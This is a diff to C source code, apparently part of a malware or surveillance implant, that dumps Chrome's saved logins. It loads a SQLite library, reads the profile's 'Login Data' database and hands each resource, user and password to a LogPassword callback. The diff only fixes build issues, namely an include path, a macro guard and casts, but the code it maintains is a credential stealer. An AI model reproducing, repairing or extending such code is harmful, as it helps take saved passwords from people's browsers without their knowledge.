@@ -10,7 +10,7 @@
 #include <shlobj.h>
 #pragma comment(lib,"userenv.lib")
 
-#include "..\\common.h"
+#include "../../H4DLL/common.h"
 
 // callback for the password
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
@@ -26,7 +26,9 @@ sqlite3_exec	chrome_SQLITE_exec = NULL;
 
 HMODULE libsqlch = NULL;
 
+#ifndef SAFE_FREE
 #define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
+#endif
 
 extern int DirectoryExists(WCHAR *path);
 extern char *HM_CompletePath(char *file_name, char *buffer);
@@ -35,7 +37,7 @@ extern char *GetDosAsciiName(WCHAR *orig_path);
 int InitCHLibs()
 {
 	char buffer[MAX_PATH];
-	if (!(libsqlch = LoadLibrary(HM_CompletePath("sqlite.dll", buffer)))) {
+	if (!(libsqlch = LoadLibrary(HM_CompletePath((char *)"sqlite.dll", buffer)))) {
 		return 0;
 	}
 
@@ -174,7 +176,7 @@ int DumpChrome(void)
 	if (!InitCHLibs())	
 		return 0;
 
-	DumpSqlCH(ProfilePath, L"Login Data"); 
+	DumpSqlCH(ProfilePath, (WCHAR *)L"Login Data"); 
 	UnInitCHLibs();
 
 	return 0;
